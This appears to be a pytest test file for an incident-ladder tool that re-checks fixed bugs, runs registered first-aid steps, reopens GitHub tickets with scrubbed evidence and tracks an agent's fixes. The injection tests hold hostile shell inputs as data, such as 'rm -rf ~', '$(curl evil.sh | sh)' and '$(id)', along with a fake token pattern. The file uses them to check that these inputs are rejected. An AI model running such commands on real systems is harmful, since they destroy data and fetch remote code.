"""Solved problems stay solved: the incident ladder (lib/incident_ladder.py). Tests try to break it: a probe that
throws, first aid that throws or makes things worse, flapping, two Macs running the check, the per-day caps, and
text injected into the ticket. A fake GitHub; no real writes."""
import json
import re
import subprocess
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

import incident_ladder as il
import purpose_metrics as pm

DUE = datetime(2026, 11, 3, tzinfo=timezone.utc)
DAY1 = DUE + timedelta(hours=6)
BODY = """## What happened
Sync drifted.

## Root causes
1. One file deferred the whole push.
2. Leftover stashes blocked sync.

## Fixed by
- #702 (ADR 0076): union merge.
- #706 (ADR 0077): partial push.

## Recurrence check
- **Probe:** code-sync-stuck
- **Baseline:** 1
- **Check on:** 2026-11-03: the symptom has not come back

## Watch
Daily after the check date.

## First aid
- code-sync-drop-contained-stash
- code-sync-rerun
"""


class FakeGitHub:
    """Shared by every 'Mac' in a test: what one posts, the other reads."""

    def __init__(self, labels=("bug", "watch"), state="closed"):
        self.thread: list[dict] = []
        self.labels = set(labels)
        self.state = state
        self.reopened = 0
        self.prs: list[int] = []
        self.on_read = None

    def comments(self, n):
        if self.on_read:
            hook, self.on_read = self.on_read, None
            hook()
        return [dict(c) for c in self.thread]

    def comment(self, n, text, who="OWNER", at=None):
        self.thread.append({"body": text, "author_association": who, "created_at": (at or DAY1).isoformat()})

    def reopen(self, n):
        self.reopened += 1
        self.state = "open"

    def add_labels(self, n, names):
        self.labels |= set(names)

    def remove_label(self, n, name):
        self.labels.discard(name)

    def open_prs_for(self, n):
        return list(self.prs)

    merged: list = []

    def merged_prs_for(self, n, since):
        if isinstance(self.merged, Exception):
            raise self.merged
        return [num for num, at in self.merged if at >= since]

    def issue(self):
        return {"number": 707, "title": "Incident: sync drift", "body": BODY, "state": self.state,
                "labels": [{"name": l} for l in sorted(self.labels)]}


class Probe:
    """A scripted probe: values in order; the last repeats. An Exception value is raised."""

    def __init__(self, *values):
        self.values = list(values)
        self.calls = []

    def __call__(self, name, days):
        self.calls.append((name, days))
        v = self.values.pop(0) if len(self.values) > 1 else self.values[0]
        if isinstance(v, Exception):
            raise v
        return float(v), {"mac-a": float(v), "mac-b": 0.0}


@pytest.fixture
def env(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    log = tmp_path / "ladder.jsonl"
    monkeypatch.setattr(il, "LOG_PATH", log)
    told, aid_calls = [], []

    def first_aid(name, only):
        aid_calls.append((name, only))
        return [{"step": name, "ok": True, "changed": True, "mac": "mac-a", "detail": "did it"}]

    def run(gh, probe, now=DAY1, aid=None):
        return il.step("o/r", gh.issue(), now, gh=gh, measure=probe, first_aid=aid or first_aid,
                       evidence=lambda p, d, only: {"mac-a": ["## sync failing", "token ghp_" + "a" * 30]},
                       notify=lambda *a: told.append(a), log_path=log)
    return {"run": run, "told": told, "aid": aid_calls, "log": log}


def _states(gh):
    return [m.group(1) for c in gh.thread for m in il._MARK.finditer(c["body"])]


# ── rung 0: watch forever ──────────────────────────────────────────────────────────────────────────────────────

def test_a_watched_fix_is_recorded_once_then_checked_daily_in_silence(env):
    gh = FakeGitHub()
    assert env["run"](gh, Probe(0))["action"] == "first-pass"
    for day in range(1, 5):
        assert env["run"](gh, Probe(0), now=DAY1 + timedelta(days=day))["action"] == "holding"
    assert len(gh.thread) == 1 and gh.thread[0]["body"].startswith(pm.OUTCOME_HEADING) and "✅" in gh.thread[0]["body"]
    assert env["told"] == []


def test_nothing_happens_before_the_check_date(env):
    gh = FakeGitHub()
    assert env["run"](gh, Probe(5), now=DUE - timedelta(hours=1))["action"] == "not-due"
    assert gh.thread == []


def test_the_daily_window_starts_at_the_last_recorded_state(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    probe = Probe(0)
    env["run"](gh, probe, now=DAY1 + timedelta(hours=12))
    assert probe.calls[0][1] == pytest.approx(0.5)
    probe = Probe(0)
    env["run"](gh, probe, now=DAY1 + timedelta(days=30))
    assert probe.calls[0][1] == pm.PROBE_WINDOW_DAYS


def test_an_old_outcome_comment_without_a_marker_still_counts_as_the_state(env):
    gh = FakeGitHub()
    gh.comment(707, f"{pm.OUTCOME_HEADING}\n\n✅ Fix held: ...")
    assert env["run"](gh, Probe(0), now=DAY1 + timedelta(days=1))["action"] == "holding"
    assert len(gh.thread) == 1


def test_a_probe_that_throws_posts_nothing_and_is_tried_tomorrow(env):
    gh = FakeGitHub()
    assert env["run"](gh, Probe(RuntimeError("ssh down")))["action"] == "not-measured"
    assert gh.thread == [] and env["told"] == [] and gh.labels == {"bug", "watch"}
    assert env["run"](gh, Probe(0), now=DAY1 + timedelta(days=1))["action"] == "first-pass"


# ── rung 1: first aid ──────────────────────────────────────────────────────────────────────────────────────────

def test_first_aid_that_clears_it_is_recorded_and_told_once(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    out = env["run"](gh, Probe(2, 0, 0), now=DAY1 + timedelta(days=1))   # trip, live before, after first aid
    assert out["action"] == "first-aid-fixed"
    assert [a[0] for a in env["aid"]] == ["code-sync-drop-contained-stash", "code-sync-rerun"]  # the ticket's order
    assert env["aid"][0][1] == {"mac-a"}                       # only the Mac whose count tripped
    assert _states(gh) == ["pass", "pass"] and gh.reopened == 0 and "regression" not in gh.labels
    assert len(env["told"]) == 1 and "fixed a regression of #707 itself" in env["told"][0][1]
    events = [json.loads(l)["event"] for l in env["log"].read_text().splitlines()]
    assert events.count("trip") == 1 and events.count("cleared") == 1
    assert il.fixed_without_you(env["log"], now=DAY1 + timedelta(days=1)) == 1


def test_first_aid_that_throws_is_a_failed_step_and_the_ladder_goes_on(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))

    def broken(name, only):
        raise RuntimeError("disk full")
    out = env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1), aid=broken)
    assert out["action"] == "reopened"
    body = gh.thread[-1]["body"]
    assert "failed" in body and "disk full" in body


def test_first_aid_that_makes_it_worse_is_flagged_and_not_run_again(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    out = env["run"](gh, Probe(1, 1, 3), now=DAY1 + timedelta(days=1))   # live before 1, after 3
    assert out["action"] == "reopened"
    assert "made it worse" in gh.thread[-1]["body"] and "aid=worse" in gh.thread[-1]["body"]
    n = len(env["aid"])
    env["run"](gh, Probe(1), now=DAY1 + timedelta(days=2))
    assert len(env["aid"]) == n


# ── rung 2 + 3: reopen with evidence, queue the fix ────────────────────────────────────────────────────────────

def test_a_regression_reopens_with_evidence_and_queues_one_fix_build(env):
    gh = FakeGitHub(state="closed")
    env["run"](gh, Probe(0))
    out = env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    assert out == {"number": 707, "action": "reopened", "queued": True, "value": 2.0}
    assert gh.reopened == 1 and {"regression", pm.MISSED_LABEL, "ready-for-agent"} <= gh.labels
    body = gh.thread[-1]["body"]
    assert "**code-sync-stuck** = **2**" in body and "mac-a 2" in body
    assert "ghp_" not in body and "[removed]" in body and "## sync failing" in body   # scrubbed again here
    assert "#702, #706" in body and "ADR 0076" in body and "ADR 0077" in body
    assert "FAILS on the current code" in body and "skills/diagnose/SKILL.md" in body
    assert re.search(r"<!-- marvin:rung3 day=\d{4}-\d{2}-\d{2} -->", body)
    assert len(env["told"]) == 1 and "fix build is queued" in env["told"][0][1]


def test_an_open_ticket_gets_a_comment_not_a_reopen(env):
    gh = FakeGitHub(state="open")
    env["run"](gh, Probe(0))
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    assert gh.reopened == 0 and "## Regression" in gh.thread[-1]["body"]


def test_a_ticket_a_person_holds_is_reopened_but_not_queued(env):
    gh = FakeGitHub(labels=("bug", "watch", "hold"))
    env["run"](gh, Probe(0))
    out = env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    assert out["queued"] is False and "ready-for-agent" not in gh.labels
    assert "needs you" in env["told"][0][1]


def test_still_failing_posts_nothing_new_while_the_build_runs(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    n, told = len(gh.thread), len(env["told"])
    assert env["run"](gh, Probe(2), now=DAY1 + timedelta(days=2))["action"] == "still-failing"
    assert len(gh.thread) == n and len(env["told"]) == told


def test_rung4_says_once_what_is_waiting_when_the_build_is_done_and_it_still_trips(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    gh.labels.discard("ready-for-agent")             # the pipeline finished (or parked) it
    gh.prs = [812]
    out = env["run"](gh, Probe(2), now=DAY1 + timedelta(days=2))
    assert out["action"] == "rung4" and "Fix PR #812 is waiting for you" in gh.thread[-1]["body"]
    assert "couldn't fix" in env["told"][-1][0]
    n = len(gh.thread)
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=3))
    assert len(gh.thread) == n


def test_a_cleared_regression_is_recorded_and_health_goes_green(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    out = env["run"](gh, Probe(0), now=DAY1 + timedelta(days=2))
    assert out["action"] == "cleared" and pm.MISSED_LABEL not in gh.labels and _states(gh)[-1] == "pass"
    assert il.hours_to_fixed(env["log"], now=DAY1 + timedelta(days=2)) == 24.0


# ── flapping, two Macs, caps ───────────────────────────────────────────────────────────────────────────────────

def test_flapping_posts_one_comment_per_change_and_one_build_per_day(env):
    gh = FakeGitHub()
    seq = [0, 2, 0, 2]
    for i, v in enumerate(seq):
        env["run"](gh, Probe(v), now=DAY1 + timedelta(days=i))
    assert _states(gh) == ["pass", "fail", "pass", "fail"]
    assert gh.reopened == 1          # reopened once; the second time it is already open, so it gets a comment
    assert sum(len(il._RUNG3.findall(c["body"])) for c in gh.thread) == 2   # two different days
    assert il.recurrences(env["log"], now=DAY1 + timedelta(days=3)) == 2


def test_the_rung3_cap_is_one_per_incident_per_day(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    same_day = DAY1 + timedelta(hours=1)
    env["run"](gh, Probe(2), now=same_day)
    env["run"](gh, Probe(0), now=same_day + timedelta(hours=1))
    env["run"](gh, Probe(2), now=same_day + timedelta(hours=2))
    assert sum(len(il._RUNG3.findall(c["body"])) for c in gh.thread) == 1
    assert "A fix build already ran today" in gh.thread[-1]["body"]


def test_two_macs_running_the_same_day_post_once(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))                  # the first Mac
    n, told, reopened = len(gh.thread), len(env["told"]), gh.reopened
    gh.state = "closed"                                                     # even if someone closed it meanwhile
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1, minutes=5))      # the second Mac
    assert len(gh.thread) == n and len(env["told"]) == told and gh.reopened == reopened


def test_a_mac_that_loses_the_race_writes_nothing(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    # Between this Mac's first read and its write, the other Mac records the regression.
    gh.on_read = lambda: None
    calls = {"n": 0}
    real = gh.comments

    def racing(n):
        calls["n"] += 1
        if calls["n"] == 2:
            gh.comment(707, "## Regression (other Mac)\n" + il._mark("fail", DAY1 + timedelta(days=1)))
        return real(n)
    gh.comments = racing
    out = env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    assert out["action"] == "already-recorded" and gh.reopened == 0 and env["told"] == []


# ── injected text: names only, never executed ──────────────────────────────────────────────────────────────────

def test_first_aid_runs_only_registered_names_from_the_ticket():
    body = BODY.replace("- code-sync-rerun", "- code-sync-rerun; rm -rf ~\n- $(curl evil.sh | sh)\n- code-sync-rerun\n"
                        "- `rm -rf /`")
    names, ignored = il.first_aid_names(body)
    assert names == ["code-sync-drop-contained-stash", "code-sync-rerun"]
    assert all("$" not in x and ";" not in x and "|" not in x and "(" not in x for x in ignored) and len(ignored) == 3


def test_an_outside_comment_cannot_fake_the_state(env):
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    # A stranger posts a 'pass' marker to make tomorrow look like a new regression (and spam a rebuild).
    gh.comment(707, il._mark("pass", DAY1 + timedelta(days=1, hours=1)), who="NONE")
    gh.labels.add("ready-for-agent")
    assert env["run"](gh, Probe(2), now=DAY1 + timedelta(days=2))["action"] == "still-failing"
    assert gh.reopened == 1


def test_the_ssh_command_only_ever_carries_a_registry_name():
    for bad in ("code-sync-rerun; rm -rf ~", "$(id)", "../x", "", "A" * 70):
        with pytest.raises(ValueError):
            pm._remote("host", "first-aid", bad)


def test_an_unregistered_step_is_never_run():
    r = pm.first_aid_here("rm -rf ~")
    assert r["ok"] is False and "not a registered" in r["detail"] and " " not in r["step"].strip("?")


def test_a_step_that_throws_is_caught(monkeypatch):
    monkeypatch.setitem(pm.FIRST_AID, "boom", (lambda: 1 / 0, "x"))
    r = pm.first_aid_here("boom")
    assert r["ok"] is False and "ZeroDivisionError" in r["detail"]


# ── the two real first-aid steps for #707, against real git ────────────────────────────────────────────────────

def _git(repo, *args):
    return subprocess.run(["git", "-C", str(repo), *args], capture_output=True, text=True, check=True).stdout


def _repo(tmp_path, name):
    repo = tmp_path / name
    repo.mkdir()
    _git(repo, "init", "-q", "-b", "main")
    _git(repo, "config", "user.email", "t@example.com")
    _git(repo, "config", "user.name", "t")
    (repo / "a.txt").write_text("one\n")
    _git(repo, "add", "a.txt")
    _git(repo, "commit", "-qm", "one")
    return repo


def test_drop_contained_stash_drops_only_what_head_already_has(tmp_path, monkeypatch):
    import code_sync
    monkeypatch.setattr(code_sync, "LOG_PATH", tmp_path / "sync-log.md")
    monkeypatch.setattr(code_sync, "machine_label", lambda: "test-mac", raising=False)
    contained, kept = _repo(tmp_path, "contained"), _repo(tmp_path, "kept")
    for repo in (contained, kept):
        (repo / "a.txt").write_text("two\n")
        _git(repo, "stash")
    (contained / "a.txt").write_text("two\n")                       # the work was committed by hand later
    _git(contained, "commit", "-qam", "two")
    state = tmp_path / "stuck.json"
    state.write_text(json.dumps({str(contained): {"since": 0, "failing": {"push": "x"}},
                                 str(kept): {"since": 0, "failing": {"pull": "x"}},
                                 "/not/a/repo": {"since": 0}, "relative/path": {}}))
    r = pm._code_sync_drop_contained_stash(state)
    assert r["changed"] is True and "contained" in r["detail"]
    assert _git(contained, "stash", "list").strip() == ""
    assert _git(kept, "stash", "list").strip() != ""                # not proven redundant: kept
    assert pm._code_sync_drop_contained_stash(state)["changed"] is False   # idempotent


def test_rerun_runs_the_failed_actions_for_each_stuck_repo_only(tmp_path):
    repo = _repo(tmp_path, "r")
    state = tmp_path / "stuck.json"
    state.write_text(json.dumps({str(repo): {"since": 0, "failing": {"pull": "x", "rm -rf": "y"}},
                                 str(tmp_path / "gone"): {"since": 0, "failing": {"push": "x"}}}))
    ran = []
    r = pm._code_sync_rerun(state, run=lambda cmd, **kw: ran.append(cmd) or subprocess.CompletedProcess(cmd, 0))
    assert [c[-2:] for c in ran] == [["pull", str(repo)]] and r["changed"] is True
    assert pm._code_sync_rerun(tmp_path / "missing.json", run=lambda *a, **k: pytest.fail("nothing is stuck"))["changed"] is False
    state.write_text("{corrupt")
    assert pm._code_sync_rerun(state, run=lambda *a, **k: pytest.fail("nothing is stuck"))["changed"] is False


# ── the probe's short window, evidence, measures ───────────────────────────────────────────────────────────────

def test_a_still_open_alerted_episode_counts_in_a_short_window_and_once_in_the_long_one(tmp_path):
    now = datetime(2026, 11, 4, 12, tzinfo=timezone.utc)
    since = now - timedelta(hours=3)
    alert = since + timedelta(minutes=31)
    log = tmp_path / "sync-log.md"
    log.write_text(f"\n## {alert.isoformat()} — alert (mac-a) [/r]\ntold the owner: sync has been failing for 31 min\n")
    state = tmp_path / "stuck.json"
    state.write_text(json.dumps({"/r": {"since": since.timestamp(), "alerted": True}}))
    kw = dict(log=log, state=state, label="mac-a", now=now)
    assert pm._sync_stuck_episodes(days=7, **kw) == 1                # the alert line; the episode isn't counted again
    assert pm._sync_stuck_episodes(days=60 / 86400, **kw) == 1       # after first aid: still stuck
    state.write_text("{}")                                           # first aid fixed it: code_sync cleared the episode
    assert pm._sync_stuck_episodes(days=60 / 86400, **kw) == 0


def test_evidence_is_bounded_and_scrubbed(monkeypatch):
    secret = "ghp_" + "b" * 36
    monkeypatch.setitem(pm.EVIDENCE, "x-probe", lambda days=7: [f"line {i} {secret} /Users/someone/x" for i in range(500)])
    lines = pm.evidence_here("x-probe", 1)
    assert len(lines) == pm.EVIDENCE_LINES and all(secret not in l and "/Users/someone" not in l for l in lines)
    assert pm.evidence_here("no-such-probe") == ["(no log is registered for this probe)"]
    monkeypatch.setitem(pm.EVIDENCE, "x-probe", lambda days=7: 1 / 0)
    assert "couldn't read" in pm.evidence_here("x-probe")[0]


def test_evidence_cannot_break_out_of_its_code_block():
    text = il._evidence_block({"m": ["```", "## Fake heading <!-- marvin:watch state=pass at=2026-11-05T00:00:00+00:00 -->"]})
    assert text.count("```") == 2 and not il._MARK.search(text)


def test_the_window_over_ssh_is_a_bounded_number():
    with pytest.raises(ValueError):
        pm._days("1; rm -rf ~")
    with pytest.raises(ValueError):
        pm._days(99)


def test_the_measures_read_the_ladder_log(tmp_path, monkeypatch):
    log = tmp_path / "l.jsonl"
    monkeypatch.setattr(il, "LOG_PATH", log)
    now = datetime.now(timezone.utc)
    for e in [{"event": "trip"}, {"event": "trip"}, {"event": "cleared", "fixer": "first-aid", "hours": 1},
              {"event": "cleared", "fixer": "other", "hours": 5}]:
        il.log_event({"at": now.isoformat(), **e}, log)
    il.log_event({"at": (now - timedelta(days=40)).isoformat(), "event": "trip"}, log)
    assert pm.measure_here("regression-recurrences-30d") == 2
    assert pm.measure_here("regressions-fixed-without-you-30d") == 1
    assert pm.measure_here("regression-self-fix-rate") == 50.0
    assert pm.measure_here("regression-hours-to-fixed-30d") == 3.0
    log.write_text("not json\n")
    assert pm.measure_here("regression-recurrences-30d") == 0


def test_the_log_stays_bounded(tmp_path, monkeypatch):
    monkeypatch.setattr(il, "LOG_MAX_LINES", 10)
    log = tmp_path / "l.jsonl"
    for i in range(25):
        il.log_event({"at": "x", "i": i}, log)
    assert len(log.read_text().splitlines()) <= 10


def test_the_daily_check_hands_watched_tickets_to_the_ladder(monkeypatch):
    watched = {"number": 707, "title": "t", "body": BODY, "labels": [{"name": "bug"}, {"name": "watch"}], "comments": 3}
    plain = {"number": 9, "title": "t", "body": BODY, "labels": [{"name": "bug"}], "comments": 0}
    monkeypatch.setattr(pm, "labelled_issues", lambda repo, name: {"bug": [watched, plain], "watch": [watched]}.get(name, []))
    monkeypatch.setattr(pm, "_gh_json", lambda path: [])
    checked = []
    monkeypatch.setattr(pm, "check_issue", lambda repo, issue, now: checked.append(issue["number"]) or {})
    seen = []
    pm.run(now=DAY1, ladder_step=lambda repo, issue, now: seen.append(issue["number"]) or {"number": 707})
    assert seen == [707] and checked == [9]


def test_one_ladder_step_failing_does_not_stop_the_others(monkeypatch):
    a = {"number": 1, "title": "t", "body": BODY, "labels": [{"name": "watch"}]}
    b = {**a, "number": 2}
    monkeypatch.setattr(pm, "labelled_issues", lambda repo, name: [a, b] if name == "watch" else [])
    seen = []

    def step(repo, issue, now):
        if issue["number"] == 1:
            raise OSError("GitHub down")
        seen.append(issue["number"])
        return {}
    pm.run(now=DAY1, ladder_step=step)
    assert seen == [2]


def test_brief_lines_come_from_the_last_day(tmp_path):
    log = tmp_path / "l.jsonl"
    now = datetime.now(timezone.utc)
    il.log_event({"at": now.isoformat(), "event": "told", "brief": "MARVIN fixed a regression of #707 itself", "brief_kind": "fixed"}, log)
    il.log_event({"at": (now - timedelta(days=2)).isoformat(), "event": "told", "brief": "old"}, log)
    assert il.brief_lines(log, now=now) == [{"kind": "fixed", "line": "MARVIN fixed a regression of #707 itself"}]


def test_fit_check_suggests_an_incident_record_for_a_watched_fix():
    import fit_check
    bare = BODY.split("## Watch")[0]
    c = fit_check.incident_record_check(bare, ["bug"])
    assert c["ok"] is False and "'## Watch' or '## First aid'" in c["detail"] and "suggestion" in c["detail"]
    assert fit_check.incident_record_check(BODY, ["bug"])["ok"] is True
    assert fit_check.incident_record_check(bare, ["enhancement"]) is None          # not a fix
    assert fit_check.incident_record_check("## What to build\nx", ["bug"]) is None  # no recurrence check
    assert fit_check.incident_record_check(None, None) is None


def test_the_pipeline_rebuilds_a_regression_despite_the_original_fix_on_main(monkeypatch):
    import json as _json
    from types import SimpleNamespace
    import ticket_pipeline as tp
    issues = [{"number": n, "title": "t", "createdAt": "2026-01-01T00:00:00Z", "updatedAt": "2026-01-01T00:00:00Z",
               "body": "", "labels": [{"name": l} for l in labels]}
              for n, labels in ((707, ["ready-for-agent", "regression"]), (8, ["ready-for-agent"]),
                                (9, ["ready-for-agent", "regression"]))]
    monkeypatch.setattr(tp.subprocess, "run", lambda *a, **kw: SimpleNamespace(returncode=0, stdout=_json.dumps(issues), stderr=""))
    monkeypatch.setattr(tp, "_evidence_facts", lambda repo: {
        "prs": [{"number": 50, "body": "Closes #9", "headRefName": "x"}], "branches": [], "rescue": [],
        "merged": [{"number": 706, "body": "Fixes #707. Fixes #8", "headRefName": "feat/x"}], "commits": []})
    assert [i["number"] for i in tp._unclaimed_ready_tickets()] == [707]     # 8 looks done; 9 is in flight


def test_the_morning_brief_says_what_the_ladder_did():
    import morning_brief as mb
    now = datetime(2026, 11, 4, 9, tzinfo=timezone.utc)
    brief = {"regressions": [{"kind": "fixed", "line": "MARVIN fixed a regression of #707 itself: first aid cleared it."},
                             {"kind": "needs-you", "line": "Regression: #707 code-sync-stuck regressed. First aid failed."}]}
    text = mb.render(brief, now)
    needs, overnight = text.split("## Overnight")
    assert "Regression: #707" in needs and "fixed a regression of #707 itself" in overnight


def test_the_regression_notification_uses_every_channel_and_never_raises(monkeypatch):
    import mr_notification as mn
    sent = []
    monkeypatch.setattr(mn, "desktop_notify", lambda t, m, open_target=None: sent.append(("desktop", m)))
    monkeypatch.setattr(mn, "push_notify", lambda m: (_ for _ in ()).throw(OSError("no session")))
    monkeypatch.setattr(mn, "dashboard_refresh_ping", lambda: sent.append(("ping", None)))
    out = mn.notify_regression("MARVIN fixed a regression itself", "x\n" * 400, "https://example.com/1")
    assert out["desktop_sent"] and not out["push_succeeded"] and len(sent[0][1]) <= 300 and "\n" not in sent[0][1]


def test_a_rung3_pr_merged_with_your_approve_counts_as_fixed_without_you(env):
    """The owner, 2026-10-27: any fix MARVIN wrote counts, approved or not."""
    gh = FakeGitHub()
    env["run"](gh, Probe(0))
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    gh.merged = [(812, DAY1 + timedelta(days=1, hours=5)), (600, DAY1 - timedelta(days=30))]   # 600: an old fix
    out = env["run"](gh, Probe(0), now=DAY1 + timedelta(days=2))
    assert out["action"] == "cleared" and "MARVIN's PR #812" in gh.thread[-1]["body"] and "#600" not in gh.thread[-1]["body"]
    later = DAY1 + timedelta(days=2)
    assert il.fixed_without_you(env["log"], now=later) == 1 and il.recurrences(env["log"], now=later) == 1
    assert "fixed a regression of #707 itself: PR #812" in env["told"][-1][1]


@pytest.mark.parametrize("merged", [[], OSError("GitHub down")])
def test_a_clearing_nobody_can_tie_to_marvin_does_not_count(env, merged):
    gh = FakeGitHub()
    gh.merged = merged
    env["run"](gh, Probe(0))
    env["run"](gh, Probe(2), now=DAY1 + timedelta(days=1))
    told = len(env["told"])
    assert env["run"](gh, Probe(0), now=DAY1 + timedelta(days=2))["action"] == "cleared"
    assert il.fixed_without_you(env["log"], now=DAY1 + timedelta(days=2)) == 0 and len(env["told"]) == told


def test_only_the_tickets_own_pipeline_prs_merged_since_the_trip_count(monkeypatch):
    gh = il.GitHub("o/r")
    since = datetime(2026, 11, 4, tzinfo=timezone.utc)
    prs = [{"number": 1, "head": {"ref": "pipeline/707"}, "merged_at": "2026-11-05T00:00:00Z"},
           {"number": 2, "head": {"ref": "pipeline/7071"}, "merged_at": "2026-11-05T00:00:00Z"},
           {"number": 3, "head": {"ref": "pipeline/707"}, "merged_at": None},                  # closed unmerged
           {"number": 4, "head": {"ref": "pipeline/707"}, "merged_at": "2026-11-01T00:00:00Z"},  # before the trip
           {"number": 5, "head": {"ref": "feat/707"}, "merged_at": "2026-11-05T00:00:00Z"},
           {"number": 6, "head": {"ref": "pipeline/o/r#707"}, "merged_at": "2026-11-05T00:00:00Z"}, "junk"]
    monkeypatch.setattr(gh, "_api", lambda *a: json.dumps(prs))
    assert gh.merged_prs_for(707, since) == [1, 6]
